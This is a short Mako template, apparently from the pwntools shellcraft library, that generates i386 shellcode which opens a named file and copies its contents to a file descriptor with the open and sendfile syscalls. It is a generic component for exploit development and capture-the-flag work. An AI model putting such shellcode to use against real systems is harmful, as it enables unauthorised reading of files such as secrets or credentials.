<%
  from pwnlib.shellcraft import i386
  from pwnlib.shellcraft import common
%>
<%page args="filename, fd=1"/>
<%docstring>
Opens a file and writes its contents to the specified file descriptor.
</%docstring>
<%
label = common.label("sendfile_loop")
%>

    ${i386.pushstr(filename)}
    ${i386.syscall('SYS_open', 'esp', 0, 'O_RDONLY')}
    ${i386.syscall('SYS_sendfile', fd, 'eax', 0, 0x7fffffff)}